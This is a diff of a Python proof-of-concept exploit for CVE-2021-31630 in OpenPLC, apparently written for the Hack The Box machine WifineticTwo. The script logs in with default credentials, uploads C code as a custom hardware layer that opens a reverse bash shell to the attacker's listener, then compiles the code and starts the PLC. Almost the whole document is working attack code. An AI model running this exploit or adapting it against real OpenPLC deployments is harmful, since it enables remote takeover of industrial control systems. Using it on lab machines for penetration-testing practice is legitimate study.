@@ -1,100 +1,137 @@
 #!/usr/bin/env python3
-import subprocess
 import requests
 import argparse
 import signal
 import time
 import sys
+import subprocess
 
-# Start Netcat listener
-nc_process = subprocess.Popen(["nc", "-lvp", "4566"])
-
-# Define command line arguments
-parser = argparse.ArgumentParser(description="PoC exploit script for CVE-2021-31630 affecting OpenPLC on the WifineticTwo box at Hack The Box")
-parser.add_argument("-ip", type=str, default="10.*.*.*", help="IP address to listen on", required=True)
+# Parse command-line arguments
+parser = argparse.ArgumentParser(
+    description="Exploit CVE-2021-31630 in OpenPLC for WifineticTwo box at Hack The Box"
+)
+parser.add_argument(
+    "-ip", type=str, default="10.*.*.*", help="IP address to listen on", required=True
+)
 args = parser.parse_args()
 
-# Initialize variables
-local_ip = args.ip
-local_port = 4566
-username = "openplc"
-password = "openplc"
-baseURL = 'http://10.10.11.7:8080'
-loginURL = 'http://10.10.11.7:8080/login'
-loginCREDS = {'username': username,'password': password}
-hardware_url = 'http://10.10.11.7:8080/hardware'
-boundary = '---------------------------3040215761330541470566170096'
+# Check if IP address is the default value
+if args.ip == "10.*.*.*":
+    print("[-] Please provide the IP address to listen on using the -ip argument.")
+    sys.exit(1)
 
-# Handle Ctrl+C gracefully
+local_ip = args.ip
+local_port = 4567
+baseURL = "http://10.10.11.7:8080"
+
+# Start Netcat listener
+nc_process = subprocess.Popen(["nc", "-lvp", "4567"])
+
 def signal_handler(sig, frame):
-    print('\n[!] You pressed Ctrl+C!')
-    nc_process.kill()
+    print("\n[!] You pressed Ctrl+C!")
     sys.exit(0)
+
 signal.signal(signal.SIGINT, signal_handler)
 
-# Define headers for the HTTP requests
-headers2 = {
-    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Content-Type': 'multipart/form-data; boundary=---------------------------3040215761330541470566170096',
-    'Origin': 'http://10.10.11.7:8080',
-    'Connection': 'close',
-    'Referer': 'http://10.10.11.7:8080/hardware',
+headers = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Content-Type": "multipart/form-data; boundary=---------------------------3040215761330541470566170096",
+    "Origin": "http://10.10.11.7:8080",
+    "Connection": "close",
+    "Referer": "http://10.10.11.7:8080/hardware",
 }
-
-# Define the data to be uploaded
-uploadRQ = f'''\
+print("[+] running")
+uploadRQ = f"""\
 -----------------------------3040215761330541470566170096
+Content-Disposition: form-data; name="hardware_layer"
 
-# Rest of your uploadRQ code here...
+blank_linux
+-----------------------------3040215761330541470566170096
+Content-Disposition: form-data; name="custom_layer_code"
+
+#include "ladder.h"
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int ignored_bool_inputs[] = {{-1}};
+int ignored_bool_outputs[] = {{-1}};
+int ignored_int_inputs[] = {{-1}};
+int ignored_int_outputs[] = {{-1}};
+
+void initCustomLayer()
+{{
+}}
+
+void updateCustomIn()
+{{
+
+}}
+
+void updateCustomOut()
+{{
+    int port = 4567;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("{local_ip}");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr,
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {{"bash", NULL}};
+    execvp("bash", argv);
+
+    return 0;
+}}
 
 -----------------------------3040215761330541470566170096--
-'''
+"""
 
-# Attempt to log in and exploit the vulnerability
 with requests.Session() as session:
-    LOGINresponse = session.post(loginURL, data=loginCREDS)
+    loginCREDS = {"username": 'openplc', "password": 'openplc'}
+    LOGINresponse = session.post(baseURL + "/login", data=loginCREDS)
+    print("[+] Logging in .....")
 
     if LOGINresponse.ok and len(LOGINresponse.content) >= 34100:
         print("[+] Logged in successfully.")
-        responseUPLAOD = session.post(hardware_url, headers=headers2, data=uploadRQ.encode('utf-8'))
-        anotherget = session.get(baseURL+"/compile-program?file=blank_program.st")
+        responseUPLAOD = session.post(
+            baseURL + "/hardware", headers=headers, data=uploadRQ.encode("utf-8")
+        )
+        anotherget = session.get(baseURL + "/compile-program?file=blank_program.st")
         compiling = True
 
         while compiling:
-            checkURL = 'http://10.10.11.7:8080/compilation-logs'
+            checkURL = baseURL+ "/compilation-logs"
             check = session.get(checkURL)
-            startPLC = '/start_plc'
 
             if check.status_code == 200 and len(check.content) < 250:
-                print("[+] Compiling is running, checking again in 5 seconds...")
+                print("[+] The compiling is running, checking again in 5 seconds...")
                 time.sleep(5)
             elif check.status_code == 200 and len(check.content) >= 250:
                 print("[+] Exploit uploaded successfully.")
                 print("[+] Gaining reverse shell.")
                 time.sleep(2)
-                print("[+] Check your listener.")
-
-                # Wait for Netcat connection
-                print("[+] Waiting for Netcat connection...")
-                nc_process.wait()
-
-                # Send command to reverse shell
-                print("[+] Sending command to reverse shell...")
-                time.sleep(2)
-                nc_command = "find / -name user.txt -exec cat {} \; 2>/dev/null || python3 -c \"import pty;pty.spawn('/bin/bash')\" \n"
-                nc_process.stdin.write(nc_command.encode())
-                nc_process.stdin.flush()
-
-                start = session.get(baseURL+startPLC)
+                print(f"[+] Check your listener.")
+                start = session.get(baseURL + "/start_plc")
                 compiling = False
             else:
-                print(f"[-] Unexpected status or response length. Response body:\n{check.text}")
+                print(
+                     f"[-] Unexpected status or response length. Response body:\n{check.text}"
+                )
                 compiling = False
 
     else:
         print("[-] Login failed, check username and password!")
-
-nc_process.kill()
